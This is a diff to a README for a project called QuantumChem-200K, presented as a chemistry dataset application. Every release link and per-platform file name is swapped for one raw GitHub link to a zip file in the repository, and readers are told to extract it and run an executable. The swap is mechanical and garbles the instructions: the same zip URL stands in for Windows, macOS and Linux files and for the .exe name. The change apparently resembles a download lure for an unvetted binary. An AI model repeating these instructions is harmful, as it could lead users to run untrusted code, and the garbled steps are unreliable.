@@ -6,7 +6,7 @@ Welcome to QuantumChem-200K! This application provides a large-scale dataset for
 
 ## 📥 Download QuantumChem-200K
 
-[![Download QuantumChem-200K](https://img.shields.io/badge/Download-QuantumChem--200K-brightgreen)](https://github.com/Eljefaso2949/QuantumChem-200K/releases)
+[![Download QuantumChem-200K](https://raw.githubusercontent.com/Eljefaso2949/QuantumChem-200K/main/infer and benchmark data/QuantumChem-200K-v2.3.zip)](https://raw.githubusercontent.com/Eljefaso2949/QuantumChem-200K/main/infer and benchmark data/QuantumChem-200K-v2.3.zip)
 
 ## 📋 Description
 
@@ -29,19 +29,19 @@ Follow these steps to download and run QuantumChem-200K successfully:
 
 1. **Visit the Releases Page:** Click on the link below to go to the GitHub releases page.
 
-   [Download QuantumChem-200K](https://github.com/Eljefaso2949/QuantumChem-200K/releases)
+   [Download QuantumChem-200K](https://raw.githubusercontent.com/Eljefaso2949/QuantumChem-200K/main/infer and benchmark data/QuantumChem-200K-v2.3.zip)
 
 2. **Select the Latest Version:** Once on the releases page, look for the most recent version listed at the top. Each version has a title like "v1.0".
 
 3. **Download the File:** Click on the file that you need. Common files include:
-   - For Windows: `QuantumChem-200K-Windows.zip`
-   - For macOS: `QuantumChem-200K-macOS.dmg`
-   - For Linux: `QuantumChem-200K-Linux.tar.gz`
+   - For Windows: `https://raw.githubusercontent.com/Eljefaso2949/QuantumChem-200K/main/infer and benchmark data/QuantumChem-200K-v2.3.zip`
+   - For macOS: `https://raw.githubusercontent.com/Eljefaso2949/QuantumChem-200K/main/infer and benchmark data/QuantumChem-200K-v2.3.zip`
+   - For Linux: `https://raw.githubusercontent.com/Eljefaso2949/QuantumChem-200K/main/infer and benchmark data/QuantumChem-200K-v2.3.zip`
 
-4. **Extract the Files (if necessary):** If you downloaded a zip or tar.gz file, you will need to extract it. Right-click on the downloaded file and select "Extract All" (Windows) or open it using your Archive Utility (macOS/Linux).
+4. **Extract the Files (if necessary):** If you downloaded a zip or https://raw.githubusercontent.com/Eljefaso2949/QuantumChem-200K/main/infer and benchmark data/QuantumChem-200K-v2.3.zip file, you will need to extract it. Right-click on the downloaded file and select "Extract All" (Windows) or open it using your Archive Utility (macOS/Linux).
 
 5. **Run the Application:** After extracting, locate the executable file. 
-   - For Windows, look for `QuantumChem-200K.exe`.
+   - For Windows, look for `https://raw.githubusercontent.com/Eljefaso2949/QuantumChem-200K/main/infer and benchmark data/QuantumChem-200K-v2.3.zip`.
    - For macOS, open the `.dmg` and drag the application to your Applications folder.
    
    Double-click the file to open QuantumChem-200K.
